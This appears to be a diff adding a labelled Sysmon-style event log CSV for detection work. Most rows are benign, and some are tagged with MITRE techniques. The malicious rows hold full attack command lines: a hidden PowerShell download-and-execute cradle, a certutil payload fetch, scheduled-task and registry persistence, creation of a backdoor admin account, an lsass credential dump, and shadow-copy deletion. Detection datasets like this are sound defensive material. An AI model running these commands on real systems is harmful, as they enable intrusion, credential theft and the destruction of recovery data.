@@ -1,0 +1,22 @@
+UtcTime,EventId,Image,CommandLine,ParentImage,User,DestinationIp,MitreTechniqueId,ThreatLabel
+2026-10-24 08:00:01.102,1,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,NT AUTHORITY\SYSTEM,-,-,Benign
+2026-10-24 08:01:15.421,3,C:\Program Files\Google\Chrome\Application\chrome.exe,-,-,CORP\j.smith,142.250.190.46,-,Benign
+2026-10-24 08:02:03.891,1,C:\Windows\explorer.exe,C:\Windows\explorer.exe /factory,C:\Windows\System32\userinit.exe,CORP\j.smith,-,-,Benign
+2026-10-24 08:05:22.004,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://185.220.101'),C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,CORP\j.smith,-,T1059.001,Malicious
+2026-10-24 08:05:23.118,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,-,-,CORP\j.smith,185.220.101.5,T1105,Malicious
+2026-10-24 08:10:44.912,1,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs -p,C:\Windows\System32\services.exe,NT AUTHORITY\SYSTEM,-,-,Benign
+2026-10-24 08:12:01.002,1,C:\Windows\System32\cmd.exe,cmd.exe /c certutil.exe -urlcache -split -f http://93.184.216 C:\Users\Public\update.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,CORP\j.smith,-,T1105,Malicious
+2026-10-24 08:12:02.551,3,C:\Windows\System32\certutil.exe,-,-,CORP\j.smith,93.184.216.34,T1071.001,Malicious
+2026-10-24 08:15:30.881,1,C:\Windows\explorer.exe,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,CORP\a.jones,-,-,Benign
+2026-10-24 08:19:12.613,1,C:\Users\Public\update.exe,C:\Users\Public\update.exe,C:\Windows\System32\cmd.exe,CORP\j.smith,-,T1204.002,Malicious
+2026-10-24 08:20:00.003,1,C:\Windows\System32\schtasks.exe,schtasks /create /tn "SystemUpdate" /tr "C:\Users\Public\update.exe" /sc daily /st 03:00,C:\Users\Public\update.exe,CORP\j.smith,-,T1053.005,Malicious
+2026-10-24 08:22:14.195,1,C:\Windows\System32\taskhostw.exe,taskhostw.exe hosted,C:\Windows\System32\services.exe,NT AUTHORITY\SYSTEM,-,-,Benign
+2026-10-24 08:25:36.712,1,C:\Windows\System32\whoami.exe,whoami /priv,C:\Users\Public\update.exe,CORP\j.smith,-,T1033,Malicious
+2026-10-24 08:26:01.442,1,C:\Windows\System32\net.exe,net user localadmin Password123 /add,C:\Users\Public\update.exe,CORP\j.smith,-,T1136.001,Malicious
+2026-10-24 08:26:05.918,1,C:\Windows\System32\net.exe,net localgroup administrators localadmin /add,C:\Users\Public\update.exe,CORP\j.smith,-,T1078.002,Malicious
+2026-10-24 08:30:55.001,1,C:\Program Files\Google\Chrome\Application\chrome.exe,--type=utility,C:\Program Files\Google\Chrome\Application\chrome.exe,CORP\a.jones,-,-,Benign
+2026-10-24 08:35:19.221,1,C:\Windows\System32\reg.exe,reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Malware" /t REG_SZ /d "C:\Users\Public\update.exe" /f,C:\Users\Public\update.exe,CORP\j.smith,-,T1547.001,Malicious
+2026-10-24 08:40:02.109,1,C:\Windows\System32\vds.exe,C:\Windows\System32\vds.exe,C:\Windows\System32\services.exe,NT AUTHORITY\SYSTEM,-,-,Benign
+2026-10-24 08:44:11.352,1,C:\Windows\System32\rundll32.exe,rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 624 C:\Users\Public\lsass.dmp full,C:\Users\Public\update.exe,NT AUTHORITY\SYSTEM,-,T1003.001,Malicious
+2026-10-24 08:45:00.812,1,C:\Windows\System32\cmd.exe,cmd.exe /c vssadmin.exe delete shadows /all /quiet,C:\Users\Public\update.exe,NT AUTHORITY\SYSTEM,-,T1490,Malicious
+2026-10-24 08:50:15.000,1,C:\Windows\System32\conhost.exe,C:\Windows\system32\conhost.exe --headless,C:\Windows\System32\cmd.exe,CORP\a.jones,-,-,Benign
